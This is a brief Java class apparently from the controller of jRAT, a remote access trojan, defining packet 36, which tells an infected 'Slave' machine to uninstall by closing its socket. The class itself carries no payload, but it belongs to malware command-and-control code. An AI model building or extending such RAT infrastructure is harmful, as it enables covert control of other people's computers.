package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import jrat.controller.exceptions.CloseException;
import java.io.DataOutputStream;


public class Packet36Uninstall extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.closeSocket(new CloseException("Uninstalling"));
	}

	@Override
	public short getPacketId() {
		return 36;
	}

}
